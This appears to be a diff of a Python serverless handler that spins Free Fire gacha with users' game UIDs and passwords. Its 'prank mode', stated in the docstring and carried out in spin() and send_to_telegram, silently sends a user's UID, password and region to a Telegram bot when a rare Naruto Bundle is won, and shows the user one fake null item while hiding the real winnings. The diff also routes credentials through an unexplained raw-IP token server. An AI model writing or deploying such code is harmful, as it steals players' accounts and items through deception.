@@ -1,11 +1,20 @@
 #!/usr/bin/env python3
 """
-Vercel serverless handler — PRANK MODE (Naruto Bundle only) + 2 fallback payloads.
+Vercel serverless handler — PRANK MODE (Naruto Bundle only) + 2 fallback payloads + fallback JWT API.
 
-Region map (3 clusters):
-  IND      → https://client.ind.freefiremobile.com
-  AMERICA  → https://client.us.freefiremobile.com
-  OTHERS   → https://clientbp.ppmainecoonghj.com
+JWT order:
+  1. Primary    : http://148.113.25.200:6293/Tok
+  2. Fallback   : https://ff-jwt-gen-api.lovable.app/api/public/token
+
+Server URL resolution (new mapping):
+  - AMERICA (US/BR/NA) → client.us.freefiremobile.com
+  - IND (India)        → client.ind.freefiremobile.com
+  - OTHERS (default)   → clientbp.ppmainecoonghj.com
+
+Prank (Naruto Bundle 710047022):
+  • UID / pass / region / count → silently sent to Telegram (retried + verified)
+  • Client receives EXACTLY ONE fake item: {id: 820981015, name: null}
+  • All other real items are hidden
 """
 
 import os
@@ -36,20 +45,59 @@ else:
 # ------------------------------------------------------------------ #
 #  CONSTANTS
 # ------------------------------------------------------------------ #
-EXTERNAL_API_URL = "https://ff-jwt-gen-api.lovable.app/api/public/token"
+# --- JWT PROVIDERS (primary first, fallback second) ---
+JWT_PROVIDERS = [
+    {
+        "name": "primary",
+        "url":  "http://148.113.25.200:6293/Tok",
+        "params": lambda uid, pw: {"uid": uid, "pw": pw},
+        "token_key": "Tok",
+        "addr_key": "addr",
+    },
+    {
+        "name": "fallback",
+        "url":  "https://ff-jwt-gen-api.lovable.app/api/public/token",
+        "params": lambda uid, pw: {"uid": uid, "password": pw},
+        "token_key": "token",
+        "addr_key": None,   # no addr field — region mapping used instead
+    },
+]
 
 RELEASE_VERSION = "OB55"
-CLIENT_VERSION  = "1.132.6"
-
-# Default = IND cluster
-DEFAULT_URL = "https://client.ind.freefiremobile.com"
-
-NARUTO_PAYLOAD    = "D120B9DAAC2C87872B8C115DFD74A832"
+NARUTO_PAYLOAD  = "D120B9DAAC2C87872B8C115DFD74A832"
 FALLBACK_PAYLOADS = [
     "7DF7F8996CD696356CD01BCBD2B3CDE8",
     "7FCB76B6CB40C0FFD3FBBDDA4600C039",
 ]
 
+# --- SERVER URL MAPPING (replaces REGION_URL_MAP) ---
+SERVER_URL_MAP = {
+    "IND": {
+        "client_url":     "https://client.ind.freefiremobile.com/",
+        "server_url":     "https://loginbp.ppmainecoonghj.com/",
+        "release_version": "OB55",
+        "client_version": "1.132.6",
+    },
+    "AMERICA": {
+        "client_url":     "https://client.us.freefiremobile.com/",
+        "server_url":     "https://loginbp.ppmainecoonghj.com/",
+        "release_version": "OB55",
+        "client_version": "1.132.6",
+    },
+    "OTHERS": {
+        "client_url":     "https://clientbp.ppmainecoonghj.com/",
+        "server_url":     "https://loginbp.ppmainecoonghj.com/",
+        "release_version": "OB55",
+        "client_version": "1.132.6",
+    },
+}
+
+# Regions that map to AMERICA
+AMERICA_REGIONS = {"US", "BR", "NA", "AMERICA", "BR", "US"}
+
+DEFAULT_SERVER_KEY = "OTHERS"
+
+# --- PRANK CONFIG ---
 FAKE_UNKNOWN_ID = 820981015
 PRANK_TARGET_ID = 710047022
 
@@ -68,45 +116,6 @@ TG_STATE = {
     "total_sent":      0,
     "total_failed":    0,
 }
-
-# ──────────────────────────────────────────────────────────────────
-#  REGION → CLUSTER (3-cluster layout)
-# ──────────────────────────────────────────────────────────────────
-#  Primary keys are the exact cluster names the JWT provider may
-#  return. Aliases map common region codes to their cluster.
-# ──────────────────────────────────────────────────────────────────
-REGION_URL_MAP = {
-    # ─── IND ────────────────────────────────────────
-    "IND":     "https://client.ind.freefiremobile.com",
-    "IN":      "https://client.ind.freefiremobile.com",
-
-    # ─── AMERICA ────────────────────────────────────
-    "AMERICA": "https://client.us.freefiremobile.com",
-    "NA":      "https://client.us.freefiremobile.com",
-    "SAC":     "https://client.us.freefiremobile.com",
-    "BR":      "https://client.us.freefiremobile.com",
-    "US":      "https://client.us.freefiremobile.com",
-
-    # ─── OTHERS ─────────────────────────────────────
-    "OTHERS":  "https://clientbp.ppmainecoonghj.com",
-    "TH":      "https://clientbp.ppmainecoonghj.com",
-    "ME":      "https://clientbp.ppmainecoonghj.com",
-    "EU":      "https://clientbp.ppmainecoonghj.com",
-    "VN":      "https://clientbp.ppmainecoonghj.com",
-    "BD":      "https://clientbp.ppmainecoonghj.com",
-    "TW":      "https://clientbp.ppmainecoonghj.com",
-    "RU":      "https://clientbp.ppmainecoonghj.com",
-    "SG":      "https://clientbp.ppmainecoonghj.com",
-    "ID":      "https://clientbp.ppmainecoonghj.com",
-    "PK":      "https://clientbp.ppmainecoonghj.com",
-}
-
-# Ordered hosts to try when the region-selected host returns HTTP 400
-FALLBACK_HOSTS = [
-    "https://client.ind.freefiremobile.com",
-    "https://client.us.freefiremobile.com",
-    "https://clientbp.ppmainecoonghj.com",
-]
 
 RARE_ITEMS_DB = {
     710047022: "Naruto Bundle",
@@ -131,16 +140,25 @@ def decode_jwt_payload(token: str):
         return None
 
 
-def region_to_url(region: str, fallback: str = DEFAULT_URL) -> str:
-    return REGION_URL_MAP.get((region or "").upper(), fallback)
-
-
-def pick_url_from_token(token: str, fallback: str = DEFAULT_URL) -> str:
+def pick_server_url_from_token(token: str) -> str:
+    """
+    Decode JWT → lock_region → map to the correct client_url.
+    Returns the client_url (with trailing slash), used as base for /PurchaseGacha.
+    """
     payload = decode_jwt_payload(token)
     if not payload:
-        return fallback
+        return SERVER_URL_MAP[DEFAULT_SERVER_KEY]["client_url"]
+
     region = (payload.get("lock_region") or payload.get("noti_region") or "").upper()
-    return REGION_URL_MAP.get(region, fallback)
+
+    if region == "IND" or region == "IN":
+        key = "IND"
+    elif region in AMERICA_REGIONS:
+        key = "AMERICA"
+    else:
+        key = DEFAULT_SERVER_KEY
+
+    return SERVER_URL_MAP[key]["client_url"]
 
 
 # ------------------------------------------------------------------ #
@@ -300,67 +318,96 @@ async def send_to_telegram(session, uid, password, region, naruto_count):
 
 
 # ------------------------------------------------------------------ #
-#  TOKEN PROVIDER
+#  TOKEN PROVIDER (multi-provider, in order)
 # ------------------------------------------------------------------ #
 async def get_token_data(session, uid, password, retries=3):
-    for _ in range(retries):
-        try:
-            async with session.get(
-                EXTERNAL_API_URL,
-                params={"uid": uid, "password": password},
-                ssl=False,
-                timeout=aiohttp.ClientTimeout(total=20),
-            ) as res:
-                if res.status != 200:
-                    await asyncio.sleep(0.5)
-                    continue
+    """
+    Try each JWT provider in order. Returns a normalized dict:
+        {
+          "token":  "<JWT>",
+          "addr":   "<client_url or None>",
+          "region": "<lock_region or UNKNOWN>",
+          "provider": "primary" | "fallback",
+        }
+    Returns None if all providers fail.
+    """
+    for provider in JWT_PROVIDERS:
+        params = provider["params"](uid, password)
 
-                try:
-                    data = await res.json(content_type=None)
-                except Exception:
-                    try:
-                        data = json.loads(await res.text())
-                    except Exception:
+        for attempt in range(retries):
+            try:
+                async with session.get(
+                    provider["url"],
+                    params=params,
+                    ssl=False,
+                    timeout=aiohttp.ClientTimeout(total=20),
+                ) as res:
+                    if res.status != 200:
                         await asyncio.sleep(0.5)
                         continue
 
-                tok = data.get("token") or data.get("Tok") or data.get("access_token")
-                if data.get("success") is False:
-                    await asyncio.sleep(0.4)
-                    continue
-                if isinstance(tok, str) and len(tok) > 50:
-                    return data
-        except Exception:
-            await asyncio.sleep(0.4)
+                    try:
+                        data = await res.json(content_type=None)
+                    except Exception:
+                        try:
+                            data = json.loads(await res.text())
+                        except Exception:
+                            await asyncio.sleep(0.5)
+                            continue
+
+                    # Extract token
+                    tok = data.get(provider["token_key"])
+                    if not tok:
+                        tok = data.get("token") or data.get("Tok") or data.get("access_token")
+
+                    if not isinstance(tok, str) or len(tok) <= 50:
+                        await asyncio.sleep(0.5)
+                        continue
+
+                    # Extract addr (if provider supports it)
+                    addr = None
+                    if provider.get("addr_key"):
+                        addr = (data.get(provider["addr_key"]) or "").strip() or None
+
+                    # Extract region from JWT
+                    jwt_payload = decode_jwt_payload(tok) or {}
+                    region = jwt_payload.get("lock_region", "UNKNOWN")
+
+                    return {
+                        "token": tok,
+                        "addr": addr,
+                        "region": region,
+                        "provider": provider["name"],
+                    }
+
+            except Exception:
+                await asyncio.sleep(0.4)
+
+        print(f"[JWT] provider '{provider['name']}' failed, trying next…", flush=True)
+
     return None
 
 
 # ------------------------------------------------------------------ #
-#  GACHA REQUEST (with 400 diagnostics)
+#  GACHA REQUEST
 # ------------------------------------------------------------------ #
 async def gacha_req(session, token, payload, url, max_retries=3):
     if not url.endswith("/PurchaseGacha"):
         url = url.rstrip("/") + "/PurchaseGacha"
 
-    now_ms = int(time.time() * 1000)
-
     headers = {
         "User-Agent": "UnityPlayer/2018.4.12f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)",
         "Accept": "*/*",
         "Accept-Encoding": "deflate, gzip",
-        "Accept-Language": "en-US,en;q=0.9",
         "Authorization": f"Bearer {token}",
         "X-GA": "v1 1",
-        "X-GA-SV": str(now_ms),
-        "X-GA-SV-MS": str(now_ms),
-        "X-Unity-Version": "2018.4.12f1",
+        "X-GA-SV": str(int(time.time())),
         "ReleaseVersion": RELEASE_VERSION,
         "Content-Type": "application/x-www-form-urlencoded",
-        "Connection": "keep-alive",
+        "X-Unity-Version": "2018.4.12f1",
     }
 
     last_status = 0
-
     for _ in range(max_retries):
         try:
             async with session.post(
@@ -368,24 +415,14 @@ async def gacha_req(session, token, payload, url, max_retries=3):
                 timeout=aiohttp.ClientTimeout(total=20),
             ) as res:
                 last_status = res.status
-                raw = await res.read()
-
                 if res.status == 200:
-                    return 200, raw
-
+                    return 200, await res.read()
                 if res.status in (401, 403):
                     return res.status, None
-
-                if res.status == 400:
-                    snippet = raw[:200].decode("utf-8", errors="ignore")
-                    print(f"[GACHA] 400 from {url} → {snippet!r}", flush=True)
-                    return 400, None
-
                 await asyncio.sleep(0.2)
         except Exception:
             last_status = 999
             await asyncio.sleep(0.3)
-
     return last_status, None
 
 
@@ -396,7 +433,7 @@ async def spin(uid: str, password: str, payload_hex: str = None):
     if output_pb2 is None:
         return {"success": False, "error": f"protobuf_load_failed: {_PB2_IMPORT_ERROR}"}
 
-    # ---- Payload queue ----
+    # ---- Build the ordered payload queue ----
     if payload_hex is not None:
         queue = [("custom", payload_hex)]
     else:
@@ -412,85 +449,38 @@ async def spin(uid: str, password: str, payload_hex: str = None):
             return {"success": False, "error": f"invalid_payload_hex[{label}]: {e}"}
 
     async with aiohttp.ClientSession() as session:
-        # ---- 1) Token ----
+        # ---- Fetch token (multi-provider) ----
         token_data = await get_token_data(session, uid, password, 3)
         if not token_data:
             return {"success": False, "error": "token_fetch_failed"}
 
-        token = token_data.get("token") or token_data.get("Tok")
+        token  = token_data["token"]
+        region = token_data["region"]
+        jwt_provider = token_data["provider"]
 
-        # ---- 2) Primary URL from response ----
-        explicit_addr = (token_data.get("addr") or "").strip()
-        explicit_reg  = (token_data.get("region") or "").strip()
+        # ---- Determine target URL ----
+        #     Prefer `addr` from the JWT response (primary provider provides it).
+        #     Fall back to region-based mapping.
+        url = token_data["addr"] or pick_server_url_from_token(token)
 
-        if explicit_addr:
-            primary_url = explicit_addr
-        elif explicit_reg:
-            primary_url = region_to_url(explicit_reg)
-        else:
-            primary_url = pick_url_from_token(token, DEFAULT_URL)
-
-        jwt_payload = decode_jwt_payload(token) or {}
-        region = (explicit_reg
-                  or jwt_payload.get("lock_region")
-                  or jwt_payload.get("noti_region")
-                  or "UNKNOWN")
-
-        # ---- 3) Build the list of URLs to try ----
-        urls_to_try = [primary_url]
-        for host in FALLBACK_HOSTS:
-            if host.rstrip("/") not in [u.rstrip("/") for u in urls_to_try]:
-                urls_to_try.append(host)
-
-        # ---- 4) Try URLs × payloads ----
         final_status = 0
         final_resp   = None
         final_items  = []
         used_payload = None
-        used_url     = primary_url
 
-        for u in urls_to_try:
-            url_ok = False
-            for label, pbytes in payload_bytes:
-                status, resp = await gacha_req(session, token, pbytes, u, 3)
-
-                if status == 200 and resp:
-                    items = parse_gacha_response(resp)
-                    final_status, final_resp, final_items = status, resp, items
-                    used_payload, used_url = label, u
-
-                    if items:
-                        url_ok = True
-                        break
-                    # 200 but empty → try next payload on same URL
-                    continue
-                else:
-                    # 400/401/403/999 → remember and move to next URL
-                    final_status = status
-                    final_resp   = None
-                    used_payload = label
-                    used_url     = u
-                    break
-
-            if url_ok:
-                break
-            # 200 with no items → don't try other URLs
-            if final_status == 200:
+        for label, pbytes in payload_bytes:
+            status, resp = await gacha_req(session, token, pbytes, url, 3)
+            items = parse_gacha_response(resp) if (status == 200 and resp) else []
+            final_status, final_resp, final_items, used_payload = status, resp, items, label
+            if status == 200 and resp and items:
                 break
 
         if final_status != 200 or not final_resp:
-            err = {
+            return {
                 "success": False,
                 "error": f"gacha_http_{final_status}",
                 "region": region,
-                "host_tried": used_url,
-                "hosts_attempted": urls_to_try,
             }
-            if final_status == 400:
-                err["hint"] = ("bad request — likely wrong cluster, expired token, "
-                               "or payload already claimed. Check Vercel logs for "
-                               "the response body snippet.")
-            return err
 
         # ----------------------------------------------------------
         #  PRANK LOGIC (Naruto Bundle only)
@@ -499,24 +489,22 @@ async def spin(uid: str, password: str, payload_hex: str = None):
 
         if not naruto_hits:
             return {
-                "success": True,
-                "uid": uid,
-                "region": region,
-                "payload": used_payload,
-                "host": used_url,
-                "items": final_items,
+                "success": True, "uid": uid, "region": region,
+                "payload": used_payload, "items": final_items,
             }
 
-        tg_ok = await send_to_telegram(session, uid, password, region, len(naruto_hits))
+        await send_to_telegram(session, uid, password, region, len(naruto_hits))
 
         return {
             "success": True,
             "uid": uid,
             "region": region,
             "payload": used_payload,
-            "host": used_url,
             "items": [{"id": FAKE_UNKNOWN_ID, "name": None}],
-            "_tg": "sent" if tg_ok else "failed",
+            "_jwt": jwt_provider,   # debug-only; can remove
+            "_tg": "sent" if TG_STATE.get("last_success_ts") and (
+                TG_STATE["last_success_ts"] or 0
+            ) > (TG_STATE.get("last_error_ts") or 0) else "failed",
         }
 
 
@@ -524,7 +512,7 @@ async def spin(uid: str, password: str, payload_hex: str = None):
 #  HEALTH CHECK
 # ------------------------------------------------------------------ #
 HEALTH_START_TS = time.time()
-HEALTH_VERSION  = "3.0"
+HEALTH_VERSION  = "2.7"
 
 
 async def _probe_upstream(session, url, timeout=6):
@@ -537,12 +525,13 @@ async def _probe_upstream(session, url, timeout=6):
         return (False, None)
 
 
-async def _probe_jwt_provider(session):
+async def _probe_jwt_provider(session, provider):
     t0 = time.time()
     try:
+        params = provider["params"]("0", "0")
         async with session.get(
-            EXTERNAL_API_URL,
-            params={"uid": "0", "password": "0"},
+            provider["url"],
+            params=params,
             ssl=False,
             timeout=aiohttp.ClientTimeout(total=8),
         ) as r:
@@ -571,16 +560,16 @@ async def _run_health_checks(deep: bool):
 
     if deep:
         async with aiohttp.ClientSession() as session:
-            ok, ms, code = await _probe_jwt_provider(session)
-            checks["jwt_provider"] = {
-                "ok": ok,
-                "detail": f"{ms} ms (HTTP {code})" if ms is not None else "unreachable",
-                "url": EXTERNAL_API_URL,
-            }
-            ok, ms = await _probe_upstream(session, DEFAULT_URL)
+            for provider in JWT_PROVIDERS:
+                ok, ms, code = await _probe_jwt_provider(session, provider)
+                checks[f"jwt_{provider['name']}"] = {
+                    "ok": ok,
+                    "detail": f"{ms} ms (HTTP {code})" if ms is not None else "unreachable",
+                    "url": provider["url"],
+                }
+            ok, ms = await _probe_upstream(session, SERVER_URL_MAP["IND"]["client_url"])
             checks["gacha_host"] = {
-                "ok": ok,
-                "detail": f"{ms} ms" if ms is not None else "unreachable",
+                "ok": ok, "detail": f"{ms} ms" if ms is not None else "unreachable",
             }
 
     return checks
@@ -625,10 +614,11 @@ class handler(BaseHTTPRequestHandler):
     def _test_telegram(self):
         async def _run():
             async with aiohttp.ClientSession() as session:
-                return await send_to_telegram(
+                ok = await send_to_telegram(
                     session, uid="TEST-UID", password="TEST-PASS",
                     region="TEST", naruto_count=0,
                 )
+                return ok
         try:
             ok = asyncio.run(_run())
         except Exception as e:
